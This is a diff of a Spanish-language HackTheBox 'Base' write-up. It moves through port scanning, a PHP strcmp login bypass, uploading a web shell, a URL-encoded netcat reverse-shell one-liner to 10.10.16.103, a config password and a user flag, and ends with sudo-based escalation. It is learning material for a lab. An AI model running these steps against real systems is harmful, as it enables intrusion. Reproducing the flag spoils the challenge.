@@ -1,26 +1,16 @@
 # Base
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 15 de enero de 2025 21:11
-IP: 10.129.127.10
+Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes EJPT: yes Created time: 15 de enero de 2025 21:11 IP: 10.129.127.10
 
 ## Recopilación de información
 
-<aside>
 💡
-
-</aside>
 
 ### **Escaneo de puertos**
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.127.10 -oG allports
@@ -35,7 +25,7 @@ PORT   STATE SERVICE REASON
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p22,80 -sCV 10.129.127.10 -oN targeted
@@ -53,42 +43,36 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-- **Identificación de vulnerabilidades**
-    - 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-    - 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+* **Identificación de vulnerabilidades**
+  * 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+  * 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+*   **Enumeración Web**
 
-- **Enumeración Web**
-    
-    
     whatweb
-    
+
     ```bash
     http://10.129.127.10 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], Email[info@base.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.127.10], Lightbox, Script, Title[Welcome to Base]
     ```
-    
-    Vemos que la web tiene una pagina de login 
-    
-    ![image.png](/images/HackTheBox/image.png)
-    
-    Siguiendo las indicaciones vemos que nos habla de *strcmp* 
-    
+
+    Vemos que la web tiene una pagina de login
+
+    ![image.png](<../../.gitbook/assets/image (1).png>)
+
+    Siguiendo las indicaciones vemos que nos habla de _strcmp_&#x20;
+
     Buscamos como hacer el bypass al formulario de login
-    
+
     [https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016).
-    
+
     Se acontece pasando valores en blanco de los parametros username y password
-    
-    ![image.png](/images/HackTheBox/image%201.png)
-    
+
+    ![image.png](<../../.gitbook/assets/image 1 (1).png>)
+
     Una vez hecho vemos el formulario de subida de ficheros
-    
 
 ## Explotación
 
-<aside>
 💡
-
-</aside>
 
 ### Explotación 1
 
@@ -100,7 +84,7 @@ Probamos a subir una revershell : cmdshell
 
 Accedemos al directorio de descargas /.uploaded y prbamos un woami
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](<../../.gitbook/assets/image 2 (1).png>)
 
 Tenemos RCE, probamos a obtener una Shell
 
@@ -112,7 +96,7 @@ URlEncodeamos
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.103%204444%20%3E%2Ftmp%2Ff
 ```
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
 Hacemos el tratamiento de la tty
 
@@ -138,7 +122,7 @@ $password = "thisisagoodpassword"
 
 Probamos a migrar a usuario Jhon
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 En el home, encontramos el flag user.txt
 
@@ -146,11 +130,11 @@ En el home, encontramos el flag user.txt
 f54846c258f3b4612f78a819573d158e
 ```
 
-### 
+###
 
 ### Escalada de privilegios
 
-Buscamos bianrios con 
+Buscamos bianrios con
 
 ```php
 sudo -l
@@ -187,7 +171,4 @@ Obtenemos la flag de root:
 
 ## Conclusión
 
-<aside>
-💡 Maquina facil, pero que he tenido que mirar writte up porque no sabia como progresar en el tema del *strcmp.* ^ Pensaba que la enumeración iba por SSH y he perdido mucho tiempo probando explotis que no funcionaban
-
-</aside>
+💡 Maquina facil, pero que he tenido que mirar writte up porque no sabia como progresar en el tema del \*strcmp.\* ^ Pensaba que la enumeración iba por SSH y he perdido mucho tiempo probando explotis que no funcionaban
